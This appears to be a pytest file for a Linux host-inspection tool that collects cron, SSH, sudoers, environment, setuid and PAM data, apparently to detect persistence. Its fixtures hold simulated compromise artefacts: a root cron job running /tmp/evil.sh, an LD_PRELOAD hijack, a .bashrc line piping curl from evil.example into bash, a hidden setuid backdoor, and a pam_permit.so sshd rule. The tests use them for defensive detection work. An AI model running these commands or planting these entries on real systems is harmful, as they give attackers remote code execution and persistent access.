import io
import json
import os
from unittest import mock

from ubuntils.collectors.source import LiveSource



# ─── ProcessCollector ─────────────────────────────────────────────────────────

def _open_proc(path, *args, **kwargs):
    if path == "/proc/123/status":
        return io.StringIO("Name:\tpython3\nUid:\t1000\t1000\t1000\t1000\n")
    if path == "/proc/123/cmdline":
        return io.StringIO("python3\x00script.py\x00")
    raise FileNotFoundError(path)


def test_process_collector_parses_status():
    from ubuntils.collectors.processes import ProcessCollector

    with mock.patch("glob.glob", return_value=["/proc/123/status"]), \
         mock.patch("os.readlink", return_value="/usr/bin/python3"), \
         mock.patch("builtins.open", side_effect=_open_proc):
        result = ProcessCollector().collect()

    assert "processes" in result
    assert len(result["processes"]) == 1
    p = result["processes"][0]
    assert p["pid"] == 123
    assert p["name"] == "python3"
    assert p["uid"] == 1000
    assert p["exe"] == "/usr/bin/python3"


def test_process_collector_skips_missing_pid():
    from ubuntils.collectors.processes import ProcessCollector

    def vanishing_open(path, *args, **kwargs):
        raise FileNotFoundError(path)

    with mock.patch("glob.glob", return_value=["/proc/999/status"]), \
         mock.patch("os.readlink", side_effect=FileNotFoundError), \
         mock.patch("builtins.open", side_effect=vanishing_open):
        result = ProcessCollector().collect()

    assert "processes" in result
    assert result["processes"] == []


def test_process_collector_returns_empty_on_glob_failure():
    from ubuntils.collectors.processes import ProcessCollector

    with mock.patch("glob.glob", side_effect=OSError("permission denied")):
        result = ProcessCollector().collect()

    assert result == {}


def test_process_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.processes import ProcessCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "proc" / "456").mkdir(parents=True)
    (files / "proc" / "456" / "status").write_text(
        "Name:\tsshd\nUid:\t0\t0\t0\t0\n"
    )
    (files / "proc" / "456" / "cmdline").write_text("sshd\x00-D\x00")

    src = BundleSource(root_dir=str(files), command_index={})
    result = ProcessCollector(source=src).collect()

    assert "processes" in result
    assert len(result["processes"]) == 1
    p = result["processes"][0]
    assert p["pid"] == 456
    assert p["name"] == "sshd"
    assert p["uid"] == 0
    assert p["cmdline"] == "sshd -D"
    # exe is a live /proc symlink read with no ArtifactSource primitive for it;
    # against a bundle (no real /proc/456/exe on this host) it degrades to "".
    assert p["exe"] == ""


# ─── NetworkCollector ─────────────────────────────────────────────────────────

SS_OUTPUT = (
    "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process\n"
    "tcp    LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          "
    "users:((\"sshd\",pid=1234,fd=3))\n"
)

NETSTAT_OUTPUT = (
    "Active Internet connections (servers and established)\n"
    "Proto Recv-Q Send-Q Local Address           Foreign Address         State"
    "       PID/Program name\n"
    "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN"
    "      1234/sshd\n"
)


def test_network_collector_parses_ss_output():
    from ubuntils.collectors.network import NetworkCollector

    with mock.patch("ubuntils.collectors.source.run_command",
                    return_value=(SS_OUTPUT, "", 0)):
        result = NetworkCollector().collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    c = result["connections"][0]
    assert c["proto"] == "tcp"
    assert c["local_port"] == "22"
    assert c["state"] == "LISTEN"


def test_network_collector_falls_back_to_netstat():
    from ubuntils.collectors.network import NetworkCollector

    def fake_run(cmd, **kwargs):
        if cmd[0] == "ss":
            return ("", "not found", 1)
        return (NETSTAT_OUTPUT, "", 0)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=fake_run):
        result = NetworkCollector().collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    assert result["connections"][0]["proto"] == "tcp"


def test_network_collector_both_fail():
    from ubuntils.collectors.network import NetworkCollector

    with mock.patch("ubuntils.collectors.source.run_command",
                    return_value=("", "error", 1)):
        result = NetworkCollector().collect()

    assert result == {}


def test_network_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.network import NetworkCollector
    from ubuntils.collectors.source import BundleSource

    captured = tmp_path / "captured"
    captured.mkdir()
    (captured / "ss.out").write_text(SS_OUTPUT)

    command_index = {"ss": str(captured / "ss.out")}
    src = BundleSource(root_dir=str(tmp_path / "files"), command_index=command_index)
    result = NetworkCollector(source=src).collect()

    assert "connections" in result
    assert len(result["connections"]) >= 1
    c = result["connections"][0]
    assert c["proto"] == "tcp"
    assert c["local_port"] == "22"
    assert c["state"] == "LISTEN"


# ─── UserCollector ────────────────────────────────────────────────────────────

PASSWD_CONTENT = (
    "root:x:0:0:root:/root:/bin/bash\n"
    "alice:x:1000:1000:Alice:/home/alice:/bin/bash\n"
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
)

GROUP_CONTENT = (
    "sudo:x:27:alice\n"
    "docker:x:999:alice\n"
)


def _open_users(path, *args, **kwargs):
    if path == "/etc/passwd":
        return io.StringIO(PASSWD_CONTENT)
    if path == "/etc/group":
        return io.StringIO(GROUP_CONTENT)
    if path == "/etc/shadow":
        return io.StringIO("root:!:19000:0:99999:7:::\nalice:$6$hash:19000:0:99999:7:::\n")
    raise FileNotFoundError(path)


def test_user_collector_parses_passwd():
    from ubuntils.collectors.users import UserCollector

    with mock.patch("builtins.open", side_effect=_open_users):
        result = UserCollector().collect()

    assert "users" in result
    users = {u["username"]: u for u in result["users"]}
    assert "alice" in users
    assert users["alice"]["uid"] == 1000
    assert users["alice"]["shell"] == "/bin/bash"
    assert users["alice"]["home"] == "/home/alice"


def test_user_collector_marks_nologin():
    from ubuntils.collectors.users import UserCollector

    with mock.patch("builtins.open", side_effect=_open_users):
        result = UserCollector().collect()

    users = {u["username"]: u for u in result["users"]}
    assert users["daemon"]["is_login_shell"] is False
    assert users["alice"]["is_login_shell"] is True


def test_user_collector_shadow_permission_error():
    from ubuntils.collectors.users import UserCollector

    def open_no_shadow(path, *args, **kwargs):
        if path == "/etc/shadow":
            raise PermissionError("permission denied")
        return _open_users(path, *args, **kwargs)

    with mock.patch("builtins.open", side_effect=open_no_shadow):
        result = UserCollector().collect()

    assert "users" in result
    for user in result["users"]:
        assert user["password_locked"] is None


# ─── CronCollector ────────────────────────────────────────────────────────────

SYSTEM_CRONTAB = (
    "# system cron\n"
    "SHELL=/bin/sh\n"
    "17 * * * * root    cd / && run-parts --report /etc/cron.hourly\n"
    "* * * * * root /tmp/evil.sh\n"
)

USER_CRONTAB_ALICE = (
    "# alice's cron\n"
    "0 9 * * 1 /home/alice/backup.sh\n"
)


def _open_cron(path, *args, **kwargs):
    if path == "/etc/crontab":
        return io.StringIO(SYSTEM_CRONTAB)
    if path == "/var/spool/cron/crontabs/alice":
        return io.StringIO(USER_CRONTAB_ALICE)
    raise FileNotFoundError(path)


def _glob_cron(pattern):
    if "/etc/cron.d" in pattern:
        return []
    if "/var/spool/cron/crontabs" in pattern:
        return ["/var/spool/cron/crontabs/alice"]
    return []


def test_cron_collector_parses_system_crontab():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    assert "cron_entries" in result
    system_entries = [e for e in result["cron_entries"] if e["source"] == "/etc/crontab"]
    assert len(system_entries) >= 1
    commands = [e["command"] for e in system_entries]
    assert any("/tmp/evil.sh" in c for c in commands)


def test_cron_collector_parses_user_crontab():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    user_entries = [e for e in result["cron_entries"] if e["owner"] == "alice"]
    assert len(user_entries) == 1
    assert "/home/alice/backup.sh" in user_entries[0]["command"]


def test_cron_collector_skips_comments():
    from ubuntils.collectors.cron import CronCollector

    with mock.patch("builtins.open", side_effect=_open_cron), \
         mock.patch("glob.glob", side_effect=_glob_cron):
        result = CronCollector().collect()

    for entry in result["cron_entries"]:
        assert not entry["command"].startswith("#")
        assert not entry.get("raw_line", "").lstrip().startswith("#")


# ─── SystemdCollector ─────────────────────────────────────────────────────────

TIMERS_JSON = json.dumps([
    {"unit": "apt-daily.timer", "activates": "apt-daily.service"},
])

EXEC_START_OUTPUT = "ExecStart=/usr/lib/apt/apt.systemd.daily install\n"

TIMERS_TEXT = (
    "NEXT                          LEFT          LAST                          "
    "PASSED       UNIT                    ACTIVATES\n"
    "Thu 2024-01-18 06:00:00 UTC   4h left       Wed 2024-01-17 06:00:00 UTC   "
    "17h ago      apt-daily.timer         apt-daily.service\n"
    "\n1 timers listed.\n"
)


def _run_systemd(cmd, **kwargs):
    if "--output" in cmd and "json" in cmd:
        return (TIMERS_JSON, "", 0)
    if "show" in cmd and "--property=ExecStart" in cmd:
        return (EXEC_START_OUTPUT, "", 0)
    return ("", "error", 1)


def test_systemd_collector_parses_json_output():
    from ubuntils.collectors.systemd import SystemdCollector

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=_run_systemd):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert len(result["timers"]) == 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"
    assert result["timers"][0]["exec_start"] == "/usr/lib/apt/apt.systemd.daily install"


def test_systemd_collector_parses_text_output():
    from ubuntils.collectors.systemd import SystemdCollector

    def run_text(cmd, **kwargs):
        if "--output" in cmd and "json" in cmd:
            return ("", "unknown option", 1)
        if "list-timers" in cmd:
            return (TIMERS_TEXT, "", 0)
        if "show" in cmd and "--property=ExecStart" in cmd:
            return (EXEC_START_OUTPUT, "", 0)
        return ("", "error", 1)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=run_text):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert len(result["timers"]) >= 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"


def test_systemd_collector_handles_missing_exec_start():
    from ubuntils.collectors.systemd import SystemdCollector

    def run_no_exec(cmd, **kwargs):
        if "--output" in cmd and "json" in cmd:
            return (TIMERS_JSON, "", 0)
        if "show" in cmd and "--property=ExecStart" in cmd:
            return ("", "not found", 1)
        return ("", "error", 1)

    with mock.patch("ubuntils.collectors.source.run_command", side_effect=run_no_exec):
        result = SystemdCollector().collect()

    assert "timers" in result
    assert result["timers"][0]["exec_start"] == ""


# ─── SSHCollector ─────────────────────────────────────────────────────────────

AUTH_KEYS_CONTENT = (
    "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ alice@laptop\n"
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI work-key\n"
)

PASSWD_SSH = "alice:x:1000:1000::/home/alice:/bin/bash\nnobody:x:65534:65534:::/usr/sbin/nologin\n"


def _ssh_root(tmp_path, keys=AUTH_KEYS_CONTENT, keys_name="authorized_keys"):
    (tmp_path / "etc").mkdir(exist_ok=True)
    (tmp_path / "etc" / "passwd").write_text(PASSWD_SSH)
    ssh_dir = tmp_path / "home" / "alice" / ".ssh"
    ssh_dir.mkdir(parents=True, exist_ok=True)
    keys_file = ssh_dir / keys_name
    keys_file.write_text(keys)
    os.utime(keys_file, (1705000000.0, 1705000000.0))
    return LiveSource(root=str(tmp_path))


def test_ssh_collector_parses_authorized_keys(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector

    result = SSHCollector(source=_ssh_root(tmp_path)).collect()

    assert "authorized_keys" in result
    assert len(result["authorized_keys"]) == 2
    first = result["authorized_keys"][0]
    assert first["username"] == "alice"
    assert first["key_type"] == "ssh-rsa"
    assert first["comment"] == "alice@laptop"
    assert first["path"] == "/home/alice/.ssh/authorized_keys"
    assert first["file_mtime"] == 1705000000.0


def test_ssh_collector_skips_missing_file(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector

    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "passwd").write_text(PASSWD_SSH)
    result = SSHCollector(source=LiveSource(root=str(tmp_path))).collect()

    assert "authorized_keys" in result
    assert result["authorized_keys"] == []


def test_ssh_collector_records_mtime(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector

    result = SSHCollector(source=_ssh_root(tmp_path)).collect()

    assert isinstance(result["authorized_keys"][0]["file_mtime"], float)


# ─── SudoersCollector ─────────────────────────────────────────────────────────

SUDOERS_CONTENT = (
    "# sudoers file\n"
    "#include /etc/sudoers.d/\n"
    "root    ALL=(ALL:ALL) ALL\n"
    "alice   ALL=(ALL:ALL) NOPASSWD: ALL\n"
    "%sudo   ALL=(ALL:ALL) ALL\n"
)

SUDOERS_D_CONTENT = "bob ALL=(ALL) NOPASSWD: /usr/bin/apt\n"


def _open_sudoers(path, *args, **kwargs):
    if path == "/etc/sudoers":
        return io.StringIO(SUDOERS_CONTENT)
    if path == "/etc/sudoers.d/bob":
        return io.StringIO(SUDOERS_D_CONTENT)
    raise FileNotFoundError(path)


def _glob_sudoers(pattern):
    if "/etc/sudoers.d" in pattern:
        return ["/etc/sudoers.d/bob"]
    return []


def test_sudoers_collector_parses_nopasswd_rule():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    assert "sudoers_rules" in result
    rules = result["sudoers_rules"]
    nopasswd_rules = [r for r in rules if "NOPASSWD" in r["options"]]
    assert len(nopasswd_rules) >= 1


def test_sudoers_collector_skips_includes():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    for rule in result["sudoers_rules"]:
        assert not rule["raw_line"].startswith("#include")
        assert not rule["raw_line"].startswith("@include")


def test_sudoers_collector_reads_sudoers_d():
    from ubuntils.collectors.sudoers import SudoersCollector

    with mock.patch("builtins.open", side_effect=_open_sudoers), \
         mock.patch("glob.glob", side_effect=_glob_sudoers):
        result = SudoersCollector().collect()

    sources = {r["source"] for r in result["sudoers_rules"]}
    assert "/etc/sudoers.d/bob" in sources


# ─── EnvironmentCollector ─────────────────────────────────────────────────────

ETC_ENVIRONMENT = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\nLANG=en_US.UTF-8\n"
BASHRC_MALICIOUS = "export LD_PRELOAD=/tmp/evil.so\nexport EDITOR=vim\n"
PASSWD_ENV = "alice:x:1000:1000::/home/alice:/bin/bash\n"


def _open_env(path, *args, **kwargs):
    if path == "/etc/environment":
        return io.StringIO(ETC_ENVIRONMENT)
    if path == "/etc/profile":
        return io.StringIO("")
    if path == "/home/alice/.bashrc":
        return io.StringIO(BASHRC_MALICIOUS)
    raise FileNotFoundError(path)


def _glob_env(pattern):
    if "/etc/profile.d" in pattern:
        return []
    return []


def test_env_collector_parses_ld_preload(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector

    (tmp_path / "etc").mkdir()
    (tmp_path / "etc" / "passwd").write_text(PASSWD_ENV)
    home = tmp_path / "home" / "alice"
    home.mkdir(parents=True)
    (home / ".bashrc").write_text(BASHRC_MALICIOUS)

    result = EnvironmentCollector(source=LiveSource(root=str(tmp_path))).collect()

    assert "env_definitions" in result
    variables = [e["variable"] for e in result["env_definitions"]]
    assert "LD_PRELOAD" in variables


def test_env_collector_reads_etc_environment():
    from ubuntils.collectors.environment import EnvironmentCollector

    def open_minimal(path, *args, **kwargs):
        if path == "/etc/passwd":
            return io.StringIO("")
        if path == "/etc/environment":
            return io.StringIO(ETC_ENVIRONMENT)
        if path == "/etc/profile":
            return io.StringIO("")
        raise FileNotFoundError(path)

    with mock.patch("builtins.open", side_effect=open_minimal), \
         mock.patch("glob.glob", side_effect=_glob_env):
        result = EnvironmentCollector().collect()

    assert "env_definitions" in result
    system_entries = [e for e in result["env_definitions"] if e["owner"] == "system"]
    assert len(system_entries) >= 1
    variables = [e["variable"] for e in system_entries]
    assert "PATH" in variables


def test_env_collector_skips_nonexistent_rc_files():
    from ubuntils.collectors.environment import EnvironmentCollector

    def open_no_rc(path, *args, **kwargs):
        if path == "/etc/passwd":
            return io.StringIO(PASSWD_ENV)
        if path == "/etc/environment":
            return io.StringIO("")
        if path == "/etc/profile":
            return io.StringIO("")
        raise FileNotFoundError(path)

    with mock.patch("builtins.open", side_effect=open_no_rc), \
         mock.patch("glob.glob", side_effect=_glob_env), \
         mock.patch("os.path.exists", return_value=False):
        result = EnvironmentCollector().collect()  # must not raise

    assert "env_definitions" in result


# ─── Collector registry ───────────────────────────────────────────────────────

def test_cron_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.cron import CronCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "cron.d").mkdir(parents=True)
    (files / "var" / "spool" / "cron" / "crontabs").mkdir(parents=True)
    (files / "etc" / "crontab").write_text(SYSTEM_CRONTAB)
    (files / "var" / "spool" / "cron" / "crontabs" / "alice").write_text(USER_CRONTAB_ALICE)

    src = BundleSource(root_dir=str(files), command_index={})
    result = CronCollector(source=src).collect()

    system_entries = [e for e in result["cron_entries"] if e["source"] == "/etc/crontab"]
    assert any("/tmp/evil.sh" in e["command"] for e in system_entries)
    user_entries = [e for e in result["cron_entries"] if e["owner"] == "alice"]
    assert len(user_entries) == 1
    assert "/home/alice/backup.sh" in user_entries[0]["command"]


def test_ssh_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "home" / "alice" / ".ssh").mkdir(parents=True)
    (files / "etc").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(PASSWD_SSH)
    (files / "home" / "alice" / ".ssh" / "authorized_keys").write_text(AUTH_KEYS_CONTENT)

    src = BundleSource(root_dir=str(files), command_index={})
    result = SSHCollector(source=src).collect()

    assert len(result["authorized_keys"]) == 2
    first = result["authorized_keys"][0]
    assert first["username"] == "alice"
    assert first["key_type"] == "ssh-rsa"
    assert first["comment"] == "alice@laptop"
    assert isinstance(first["file_mtime"], float)


def test_ssh_collector_captures_ctime_and_options(tmp_path):
    from ubuntils.collectors.ssh import SSHCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    home = files / "home" / "alice"
    (home / ".ssh").mkdir(parents=True)
    (files / "etc").mkdir()
    (files / "etc" / "passwd").write_text(
        "alice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (home / ".ssh" / "authorized_keys").write_text(
        'command="/bin/echo hi",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 ci@runner\n'
        "ssh-rsa AAAAB3NzaC1yc2E alice@laptop\n"
    )

    src = BundleSource(root_dir=str(files), command_index={})
    result = SSHCollector(source=src).collect()

    entries = result["authorized_keys"]
    assert len(entries) == 2
    first, second = entries
    assert first["options"] == 'command="/bin/echo hi",no-pty'
    assert first["key_type"] == "ssh-ed25519"
    assert first["comment"] == "ci@runner"
    assert first["file_ctime"] > 0
    assert second["options"] == ""
    assert second["key_type"] == "ssh-rsa"


def test_sudoers_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.sudoers import SudoersCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "sudoers.d").mkdir(parents=True)
    (files / "etc" / "sudoers").write_text(SUDOERS_CONTENT)
    (files / "etc" / "sudoers.d" / "bob").write_text(SUDOERS_D_CONTENT)

    src = BundleSource(root_dir=str(files), command_index={})
    result = SudoersCollector(source=src).collect()

    rules = result["sudoers_rules"]
    nopasswd_rules = [r for r in rules if "NOPASSWD" in r["options"]]
    assert len(nopasswd_rules) >= 2
    sources = {r["source"] for r in rules}
    assert "/etc/sudoers.d/bob" in sources
    for rule in rules:
        assert not rule["raw_line"].startswith("#include")


def test_env_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "profile.d").mkdir(parents=True)
    (files / "home" / "alice").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(PASSWD_ENV)
    (files / "etc" / "environment").write_text(ETC_ENVIRONMENT)
    (files / "etc" / "profile").write_text("")
    (files / "home" / "alice" / ".bashrc").write_text(BASHRC_MALICIOUS)

    src = BundleSource(root_dir=str(files), command_index={})
    result = EnvironmentCollector(source=src).collect()

    definitions = result["env_definitions"]
    variables = [e["variable"] for e in definitions]
    assert "LD_PRELOAD" in variables
    assert "PATH" in variables
    ld_preload = next(e for e in definitions if e["variable"] == "LD_PRELOAD")
    assert ld_preload["owner"] == "alice"
    assert ld_preload["value"] == "/tmp/evil.so"


def test_systemd_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.systemd import SystemdCollector
    from ubuntils.collectors.source import BundleSource

    captured = tmp_path / "captured"
    captured.mkdir()
    (captured / "list_timers_json.out").write_text(TIMERS_JSON)
    (captured / "exec_start.out").write_text(EXEC_START_OUTPUT)

    command_index = {
        "systemctl_list_timers_json": str(captured / "list_timers_json.out"),
        "systemctl_show_execstart": str(captured / "exec_start.out"),
    }
    src = BundleSource(root_dir=str(tmp_path / "files"), command_index=command_index)
    result = SystemdCollector(source=src).collect()

    assert "timers" in result
    assert len(result["timers"]) == 1
    assert result["timers"][0]["unit"] == "apt-daily.timer"
    assert result["timers"][0]["exec_start"] == "/usr/lib/apt/apt.systemd.daily install"


def test_user_collector_reads_from_source(tmp_path):
    from ubuntils.collectors.users import UserCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc").mkdir(parents=True)
    (files / "etc" / "passwd").write_text(
        "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (files / "etc" / "group").write_text("sudo:x:27:alice\n")
    (files / "etc" / "shadow").write_text("root:!:0:0:::::\nalice:$6$abc:0:0:::::\n")

    src = BundleSource(root_dir=str(files), command_index={})
    result = UserCollector(source=src).collect()

    usernames = [u["username"] for u in result["users"]]
    assert usernames == ["root", "alice"]
    alice = next(u for u in result["users"] if u["username"] == "alice")
    assert alice["groups"] == ["sudo"]
    assert alice["password_locked"] is False


def test_all_collectors_registered():
    from ubuntils.collectors import ALL_COLLECTORS
    assert len(ALL_COLLECTORS) == 11


def test_all_collectors_are_base_collector_subclasses():
    from ubuntils.collectors import ALL_COLLECTORS
    from ubuntils.collectors.base import BaseCollector
    for cls in ALL_COLLECTORS:
        assert issubclass(cls, BaseCollector), f"{cls} is not a BaseCollector subclass"


def test_environment_collector_captures_shell_init_files(tmp_path):
    from ubuntils.collectors.environment import EnvironmentCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    home = files / "home" / "alice"
    home.mkdir(parents=True)
    (files / "etc").mkdir()
    (files / "etc" / "passwd").write_text(
        "alice:x:1000:1000::/home/alice:/bin/bash\n"
    )
    (home / ".bashrc").write_text("curl http://evil.example | bash\n")

    src = BundleSource(root_dir=str(files), command_index={})
    result = EnvironmentCollector(source=src).collect()

    shell_files = result["shell_init_files"]
    assert len(shell_files) == 1
    entry = shell_files[0]
    assert entry["owner"] == "alice"
    assert entry["source"] == "/home/alice/.bashrc"
    assert "curl http://evil.example | bash" in entry["content"]
    assert entry["ctime"] > 0


def test_package_collector_parses_dpkg_verify(tmp_path):
    from ubuntils.collectors.packages import PackageCollector
    from ubuntils.collectors.source import BundleSource

    cmds = tmp_path / "commands"
    cmds.mkdir()
    (cmds / "dpkg_verify.txt").write_text(
        "??5?????? c /etc/ssh/sshd_config\n"
        "missing   /usr/bin/sshd\n"
        "....5..T. /usr/bin/passwd\n"
    )
    (cmds / "lsattr_sensitive.txt").write_text("")
    (cmds / "find_setuid.txt").write_text("")
    src = BundleSource(
        root_dir=str(tmp_path / "files"),
        command_index={
            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
            "find_setuid": str(cmds / "find_setuid.txt"),
        },
    )

    result = PackageCollector(source=src).collect()

    entries = result["dpkg_verify_entries"]
    # This bundle predates dpkg_owners capture, so ownership is unknown.
    assert {"path": "/etc/ssh/sshd_config", "flags": "??5??????", "is_conffile": True, "missing": False, "package": None, "is_directory": None} in entries
    assert {"path": "/usr/bin/sshd", "flags": "", "is_conffile": False, "missing": True, "package": None, "is_directory": None} in entries
    assert {"path": "/usr/bin/passwd", "flags": "....5..T.", "is_conffile": False, "missing": False, "package": None, "is_directory": None} in entries


def test_package_collector_parses_lsattr_immutable_flags(tmp_path):
    from ubuntils.collectors.packages import PackageCollector
    from ubuntils.collectors.source import BundleSource

    cmds = tmp_path / "commands"
    cmds.mkdir()
    (cmds / "dpkg_verify.txt").write_text("")
    (cmds / "lsattr_sensitive.txt").write_text(
        "----i--------e--- /etc/ld.so.preload\n"
        "-------------e--- /etc/passwd\n"
        "lsattr: No such file or directory - /etc/sudoers.d/custom\n"
    )
    (cmds / "find_setuid.txt").write_text("")
    src = BundleSource(
        root_dir=str(tmp_path / "files"),
        command_index={
            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
            "find_setuid": str(cmds / "find_setuid.txt"),
        },
    )

    result = PackageCollector(source=src).collect()

    assert {"path": "/etc/ld.so.preload", "attrs": "----i--------e---"} in result["immutable_flags"]
    assert {"path": "/etc/passwd", "attrs": "-------------e---"} in result["immutable_flags"]
    assert len(result["immutable_flags"]) == 2  # the lsattr error line is skipped, not crashed on


def test_package_collector_parses_setuid_binaries(tmp_path):
    from ubuntils.collectors.packages import PackageCollector
    from ubuntils.collectors.source import BundleSource

    cmds = tmp_path / "commands"
    cmds.mkdir()
    (cmds / "dpkg_verify.txt").write_text("")
    (cmds / "lsattr_sensitive.txt").write_text("")
    (cmds / "find_setuid.txt").write_text(
        "/usr/bin/sudo\n/usr/bin/passwd\n/tmp/.hidden/backdoor\n"
    )
    src = BundleSource(
        root_dir=str(tmp_path / "files"),
        command_index={
            "dpkg_verify": str(cmds / "dpkg_verify.txt"),
            "lsattr_sensitive": str(cmds / "lsattr_sensitive.txt"),
            "find_setuid": str(cmds / "find_setuid.txt"),
        },
    )

    result = PackageCollector(source=src).collect()

    # Legacy bundle output (bare paths, no -printf mode): bit unknown, treated as setuid.
    assert result["setuid_binaries"] == [
        {"path": "/usr/bin/sudo", "setuid": True, "setgid": False},
        {"path": "/usr/bin/passwd", "setuid": True, "setgid": False},
        {"path": "/tmp/.hidden/backdoor", "setuid": True, "setgid": False},
    ]
    assert result["dpkg_verify_collection_failed"] is False
    assert result["setuid_collection_failed"] is False


class _SpySource:
    """Minimal ArtifactSource stand-in that records every run() call's kwargs
    so tests can assert PackageCollector passes non-default, generous timeouts
    for the two slow commands (dpkg --verify, find_setuid) without depending
    on those binaries actually existing or being slow on the test runner."""

    def __init__(self, responses=None):
        self.calls = []
        self._responses = responses or {}

    def run(self, name, argv, timeout=30):
        self.calls.append({"name": name, "argv": argv, "timeout": timeout})
        return self._responses.get(name, ("", "", 0))

    def read_text(self, path):
        raise OSError(path)

    def read_bytes(self, path):
        raise OSError(path)

    def exists(self, path):
        return False

    def lstat(self, path):
        raise OSError(path)

    def glob(self, pattern):
        return []


def test_package_collector_uses_generous_non_default_timeouts_for_slow_commands():
    from ubuntils.collectors.packages import (
        PackageCollector, DPKG_VERIFY_TIMEOUT, FIND_SETUID_TIMEOUT,
    )

    src = _SpySource()
    PackageCollector(source=src).collect()

    calls_by_name = {c["name"]: c for c in src.calls}
    assert calls_by_name["dpkg_verify"]["timeout"] == DPKG_VERIFY_TIMEOUT
    assert calls_by_name["find_setuid"]["timeout"] == FIND_SETUID_TIMEOUT
    # Both must be well above the ArtifactSource.run default of 30s.
    assert DPKG_VERIFY_TIMEOUT > 30
    assert FIND_SETUID_TIMEOUT > 30


def test_package_collector_find_setuid_scans_setgid_and_attacker_drop_locations():
    from ubuntils.collectors.packages import PackageCollector

    src = _SpySource()
    PackageCollector(source=src).collect()

    calls_by_name = {c["name"]: c for c in src.calls}
    argv = calls_by_name["find_setuid"]["argv"]
    for path in ("/opt", "/home", "/srv", "/usr", "/bin", "/sbin", "/tmp", "/var/tmp", "/dev/shm"):
        assert path in argv
    assert "-2000" in argv  # setgid
    assert "-4000" in argv  # setuid


def test_package_collector_distinguishes_timeout_from_clean_empty_output():
    from ubuntils.collectors.packages import PackageCollector

    # rc == -1 is shell.run_command's convention for a timeout/OSError.
    timed_out_src = _SpySource(responses={
        "dpkg_verify": ("", "Command timed out after 600 seconds", -1),
        "find_setuid": ("", "Command timed out after 300 seconds", -1),
    })
    result = PackageCollector(source=timed_out_src).collect()
    assert result["dpkg_verify_entries"] == []
    assert result["setuid_binaries"] == []
    assert result["dpkg_verify_collection_failed"] is True
    assert result["setuid_collection_failed"] is True

    clean_src = _SpySource(responses={
        "dpkg_verify": ("", "", 0),
        "find_setuid": ("", "", 0),
    })
    clean_result = PackageCollector(source=clean_src).collect()
    assert clean_result["dpkg_verify_entries"] == []
    assert clean_result["setuid_binaries"] == []
    assert clean_result["dpkg_verify_collection_failed"] is False
    assert clean_result["setuid_collection_failed"] is False


# ─── PamCollector ────────────────────────────────────────────────────────────

def test_pam_collector_reads_pam_d_and_nsswitch(tmp_path):
    from ubuntils.collectors.pam import PamCollector
    from ubuntils.collectors.source import BundleSource

    files = tmp_path / "files"
    (files / "etc" / "pam.d").mkdir(parents=True)
    (files / "etc" / "pam.d" / "sshd").write_text("auth sufficient pam_permit.so\n")
    (files / "etc" / "pam.d" / "common-auth").write_text("auth required pam_unix.so nullok\n")
    (files / "etc" / "nsswitch.conf").write_text("passwd: files systemd\n")

    src = BundleSource(root_dir=str(files), command_index={})
    result = PamCollector(source=src).collect()

    paths = {f["path"] for f in result["pam_files"]}
    assert paths == {"/etc/pam.d/sshd", "/etc/pam.d/common-auth"}
